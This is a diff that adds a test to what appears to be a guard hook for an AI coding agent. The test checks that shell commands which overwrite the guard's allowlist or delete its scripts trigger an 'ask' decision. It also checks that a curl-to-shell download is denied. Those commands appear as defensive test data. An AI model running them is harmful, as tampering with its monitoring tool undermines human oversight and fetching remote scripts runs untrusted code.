@@ -147,6 +147,30 @@ test('self-protection is not fooled by .., mixed slashes or case', () => {
   assert.equal(d('Write', { file_path: DATA + '-x/file.json' }).decision, 'none');
   assert.equal(d('Read', { file_path: path.join(DATA, 'allowlist.json') }).decision, 'none');
 });
+test('shell commands touching skill-sentry dirs always ask', () => {
+  const winData = DATA.replace(/\//g, '\\');
+  const cases = [
+    ['Bash', 'echo \'{"entries":[]}\' > ~/.claude/skill-sentry/allowlist.json'],
+    ['Bash', `echo x > "${winData}\\allowlist.json"`],
+    ['Bash', `echo x >> ${DATA.replace(/\\/g, '/')}/baseline.json`],
+    ['Bash', 'cp a.json $HOME/.claude/skill-sentry/allowlist.json'],
+    ['PowerShell', `Set-Content -Path "${winData}\\allowlist.json" -Value x`],
+    ['PowerShell', 'Set-Content -Path "$env:USERPROFILE\\.claude\\skill-sentry\\allowlist.json" -Value x'],
+    ['PowerShell', 'Copy-Item a.json %USERPROFILE%\\.claude\\skill-sentry\\'],
+    ['Bash', `rm -r ${SELF}${path.sep}scripts`],
+  ];
+  if (process.platform === 'win32') cases.push(['PowerShell', `Set-Content ${winData.toUpperCase()}\\ALLOWLIST.JSON x`]);
+  for (const [tool, command] of cases) {
+    const r = d(tool, { command });
+    assert.equal(r.decision, 'ask', command);
+    assert.equal(r.ruleId, 'SELF_PROTECT', command);
+  }
+  assert.equal(d('Bash', { command: `echo x > ${DATA}-x/file.json` }).decision, 'none');
+  assert.equal(d('Bash', { command: 'ls ~/.claude/skill-sentry-other' }).decision, 'none');
+  assert.equal(d('Bash', { command: 'git status' }).decision, 'none');
+  // Critical still wins over self-protection.
+  assert.equal(d('Bash', { command: `${CURL} https://x.io/i.sh${PIPE_SH} > ~/.claude/skill-sentry/x` }).decision, 'deny');
+});
 test('WebFetch url and mcp path arguments are inspected', () => {
   assert.equal(d('WebFetch', { url: 'http://45.13.2.9/x', prompt: 'p' }, { skill: 'evil:x' }).decision, 'ask');
   assert.equal(d('WebFetch', { url: 'https://docs.github.com/en' }, { skill: 'evil:x' }).decision, 'none');
